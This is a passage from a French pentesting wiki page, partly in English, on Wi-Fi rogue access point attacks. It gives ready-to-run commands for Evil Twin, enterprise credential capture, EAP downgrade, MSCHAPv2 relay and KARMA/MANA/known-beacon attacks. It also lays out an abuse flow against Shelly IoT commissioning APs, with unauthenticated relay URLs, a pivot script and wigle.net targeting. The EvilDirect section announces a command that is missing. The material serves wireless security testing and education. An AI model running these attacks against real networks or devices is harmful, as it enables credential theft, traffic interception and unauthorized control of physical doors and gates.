- Le protocole exige l'authentification de la station à l'ESS mais n'impose pas l'authentification de l'AP envers la station.

### Preferred Network Lists (PNLs)

- Les stations stockent l'ESSID de chaque réseau sans fil auquel elles se connectent dans leur Preferred Network List (PNL), ainsi que les détails de configuration spécifiques au réseau.
- Le PNL est utilisé pour se connecter automatiquement aux réseaux connus, améliorant l'expérience utilisateur en simplifiant le processus de connexion.

### Scan passif

- Les APs émettent périodiquement des trames beacon, annonçant leur présence et leurs fonctionnalités, y compris l'ESSID de l'AP sauf si la diffusion est désactivée.
- Lors d'un scan passif, les stations écoutent les trames beacon. Si l'ESSID d'un beacon correspond à une entrée du PNL de la station, la station peut se connecter automatiquement à cet AP.
- La connaissance du PNL d'un appareil permet une exploitation potentielle en mimant l'ESSID d'un réseau connu, trompant l'appareil pour qu'il se connecte à un AP malveillant.

### Sondage actif

- Le sondage actif implique que les stations envoient des probe requests pour découvrir les APs à proximité et leurs caractéristiques.
- Les directed probe requests ciblent un ESSID spécifique, aidant à détecter si un réseau particulier est à portée, même s'il est caché.
- Les broadcast probe requests ont un champ SSID nul et sont envoyées à tous les APs proches, permettant à la station de vérifier la présence d'un réseau préféré sans divulguer le contenu de son PNL.

## Simple AP with redirection to Internet

Avant d'expliquer comment réaliser des attaques plus complexes, on va expliquer **comment** simplement **créer** un **AP** et **rediriger** son **trafic** vers une interface connectée **à** l'**Internet**.

En utilisant `ifconfig -a`, vérifiez que l'interface wlan destinée à créer l'AP et l'interface connectée à Internet sont présentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Créer le fichier de configuration `/etc/dnsmasq.conf` :
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **configurez les IPs** et **les routes** :
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Ensuite, **démarrez** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Créer un fichier de configuration `hostapd.conf` :
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arrêter les processus gênants** , passer en **monitor mode**, et **démarrer hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Transfert et redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Une evil twin attack exploite la façon dont les clients WiFi reconnaissent les réseaux, reposant principalement sur le nom du réseau (ESSID) sans exiger que la station de base (access point) s'authentifie auprès du client. Points clés :

- **Difficulté de différenciation** : Les appareils ont du mal à distinguer les points d'accès légitimes des points d'accès malveillants lorsqu'ils partagent le même ESSID et le même type de chiffrement. Les réseaux réels utilisent souvent plusieurs points d'accès avec le même ESSID pour étendre la couverture de manière transparente.
- **Itinérance des clients et manipulation de la connexion** : Le protocole 802.11 permet aux appareils d'itinérer entre des points d'accès au sein du même ESS. Les attaquants peuvent exploiter cela en incitant un appareil à se déconnecter de sa station de base actuelle et à se connecter à un point d'accès malveillant. Cela peut être obtenu en offrant un signal plus fort ou en perturbant la connexion au point d'accès légitime via des méthodes comme des deauthentication packets ou du jamming.
- **Défis d'exécution** : Réussir une evil twin attack dans des environnements avec plusieurs points d'accès bien placés peut être difficile. Déauthentifier un seul point d'accès légitime entraîne souvent la connexion de l'appareil à un autre point d'accès légitime, à moins que l'attaquant ne puisse déauthentifier tous les points d'accès à proximité ou placer stratégiquement le point d'accès malveillant.

Vous pouvez créer un Open Evil Twin très basique (sans capacité à router le trafic vers Internet) en faisant :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez également créer un Evil Twin en utilisant **eaphammer** (notez que pour créer evil twins avec eaphammer l'interface **ne doit PAS être** en **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Veuillez noter que par défaut, si un ESSID dans le PNL est enregistré comme protégé par WPA, l'appareil ne se connectera pas automatiquement à un Open Evil Twin. Vous pouvez tenter de DoS le vrai AP et espérer que l'utilisateur se connectera manuellement à votre Open Evil Twin, ou vous pouvez DoS le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (avec cette méthode vous ne pourrez pas laisser la victime se connecter à vous car vous ne connaissez pas le PSK, mais vous pouvez capturer le handshake et tenter de le cracker).

_Certains OS et AV avertiront l'utilisateur que se connecter à un réseau Open est dangereux..._

### WPA/WPA2 Evil Twin

Vous pouvez créer un **Evil Twin utilisant WPA/2** et si les appareils sont configurés pour se connecter à ce SSID avec WPA/2, ils vont essayer de se connecter. Quoi qu'il en soit, **pour compléter le 4-way-handshake** vous devez aussi **connaître** le **mot de passe** que le client va utiliser. Si vous **ne le connaissez pas**, la **connexion ne sera pas complétée**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Pour comprendre ces attaques, je recommande de lire d'abord la brève [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` a besoin d'un fichier de **configuration** pour fonctionner. Pour **automatiser** la génération de ces configurations, vous pouvez utiliser [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (téléchargez le fichier python dans _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez sélectionner de nombreuses choses différentes comme ssid, channel, user files, cert/key, dh parameters, wpa version et auth...

[**Utiliser hostapd-wpe avec EAP-TLS pour permettre à n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utiliser EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par défaut, EAPHammer privilégie ces auth methods (notez GTC comme la première à essayer d'obtenir plaintext passwords, puis l'utilisation de auth methods plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ceci est la méthodologie par défaut pour éviter les longs temps de connexion. Cependant, vous pouvez aussi indiquer au serveur les méthodes d'authentification de la plus faible à la plus forte :
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Cette méthode permet à un **attaquant de créer un point d'accès malveillant (AP) qui répond à toutes les probe requests** des appareils cherchant à se connecter à des réseaux. Cette technique **trompe les appareils pour qu'ils se connectent à l'AP de l'attaquant** en imitant les réseaux que les appareils recherchent. Une fois qu'un appareil envoie une requête de connexion à cet rogue AP, la connexion s'établit, amenant l'appareil à se connecter par erreur au réseau de l'attaquant.

### MANA

Puis, **les appareils ont commencé à ignorer les réponses réseau peu fiables**, réduisant l'efficacité de l'original karma attack. Cependant, une nouvelle méthode, connue sous le nom de **MANA attack**, a été introduite par Ian de Villiers et Dominic White. Cette méthode implique que le rogue AP **capture les Preferred Network Lists (PNL) des appareils en répondant à leurs broadcast probe requests** avec des noms de réseau (SSIDs) précédemment sollicités par les appareils. Cette attaque sophistiquée contourne les protections contre l'original karma attack en exploitant la façon dont les appareils se souviennent et priorisent les réseaux connus.

L'attaque MANA fonctionne en surveillant à la fois les directed et broadcast probe requests des appareils. Pour les directed requests, elle enregistre l'adresse MAC de l'appareil et le nom du réseau demandé, ajoutant ces informations à une liste. Lorsqu'une broadcast request est reçue, l'AP répond avec des informations correspondant à l'un des réseaux présents dans la liste de l'appareil, incitant l'appareil à se connecter au rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Une attaque **Loud MANA** est une stratégie avancée pour les cas où les appareils n'utilisent pas de directed probing ou lorsque leurs Preferred Network Lists (PNL) sont inconnues de l'attaquant. Elle s'appuie sur le principe que **les appareils situés dans la même zone partagent probablement certains noms de réseau dans leurs PNLs**. Plutôt que de répondre de façon sélective, cette attaque diffuse des probe responses pour chaque nom de réseau (ESSID) trouvé dans les PNLs combinées de tous les appareils observés. Cette approche étendue augmente les chances qu'un appareil reconnaisse un réseau familier et tente de se connecter au rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quand la **Loud MANA attack** ne suffit pas, la **Known Beacon attack** offre une autre approche. Cette méthode **brute-forces le processus de connexion en simulant un AP qui répond à n'importe quel nom de réseau, en parcourant une liste d'ESSIDs potentielles** issue d'une wordlist. Cela simule la présence de nombreux réseaux, dans l'espoir de faire correspondre un ESSID dans la PNL de la victime, ce qui déclenche une tentative de connexion vers l'AP factice. L'attaque peut être amplifiée en la combinant avec l'option `--loud` pour une tentative plus agressive de piéger les appareils.

Eaphammer a implémenté cette attaque comme une MANA attack où tous les ESSIDs d'une liste sont chargés (vous pouvez aussi combiner cela avec `--loud` pour créer une Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

L'**Known Beacon Burst attack** implique **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Cela crée un environnement dense de réseaux factices, augmentant fortement la probabilité que des appareils se connectent au rogue AP, surtout lorsqu'elle est combinée à une MANA attack. Cette technique exploite la vitesse et le volume pour submerger les mécanismes de sélection de réseau des appareils.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** est un protocole permettant à des appareils de se connecter directement entre eux via Wi-Fi sans nécessiter un access point traditionnel. Cette fonctionnalité est intégrée dans divers appareils Internet of Things (IoT), tels que les imprimantes et les téléviseurs, facilitant la communication directe device-to-device. Une caractéristique notable de Wi-Fi Direct est qu’un appareil prend le rôle d’un access point, connu sous le nom de group owner, pour gérer la connexion.

La sécurité des connexions Wi-Fi Direct est assurée via **Wi-Fi Protected Setup (WPS)**, qui prend en charge plusieurs méthodes d’appariement sécurisé, notamment :

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ces méthodes, en particulier PIN entry, sont vulnérables aux mêmes failles que WPS dans les réseaux Wi-Fi traditionnels, ce qui en fait des cibles pour des vecteurs d’attaque similaires.

### EvilDirect Hijacking

**EvilDirect Hijacking** est une attaque spécifique à Wi-Fi Direct. Elle reprend le concept d’une Evil Twin attack mais cible les connexions Wi-Fi Direct. Dans ce scénario, un attaquant usurpe un group owner légitime afin de tromper des appareils pour qu’ils se connectent à une entité malveillante. Cette méthode peut être exécutée avec des outils comme `airbase-ng` en spécifiant le channel, ESSID, et la MAC address de l’appareil usurpé :

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Certains relays/controllers IoT grand public laissent le commissioning **open AP** actif après la jonction au IoT WLAN (par ex., Shelly Gen4 SSIDs commençant par `Shelly`). L’appareil reste **dual-homed** : une AP interface avec default IP `192.168.33.1` plus une client interface sur le WLAN interne.

**Abuse flow (Wi‑Fi proximity required):**

1. Join the provisioning AP, obtain a DHCP lease, and browse the **AP-side HTTP API**.
2. Trigger relays via unauthenticated endpoints, e.g. `http://192.168.33.1/relay/0?turn=on` (door/gate/garage impact). Firmware upload endpoints can add persistence.
3. Use it as a **pivot**: Shelly scripting can send HTTP from the internal interface to other LAN hosts. Example pivot to another Shelly at `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Remplacez l’URL par n’importe quelle cible HTTP interne accessible ; le dual-homing évite des travaux de routage/NAT supplémentaires.
4. At-scale: query vendor SSIDs on **wigle.net** (e.g., `Shelly`) to locate commissioning APs for on-site exploitation.

Pour obtenir de la persistance, laissez le commissioning AP activé.

## Références

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO : Jeter un œil à [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login avec facebook et imitation de WPA dans les captive portals)

{{#include ../../banners/hacktricks-training.md}}
